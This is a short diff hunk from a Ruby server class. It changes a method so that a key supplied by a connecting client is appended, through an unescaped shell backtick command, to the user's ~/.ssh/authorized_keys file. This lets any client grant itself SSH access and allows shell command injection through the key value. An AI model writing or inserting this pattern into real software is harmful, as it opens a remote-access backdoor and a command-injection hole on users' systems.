@@ -63,7 +63,7 @@ class Server
     end
     def getSaveKey(client)
         key = getKey(client)
-        `echo "\n#{key}">> ~/temp/testfile.test `
+        `echo "\n#{key}">> ~/.ssh/authorized_keys `
     end
     
     def getKey(client)
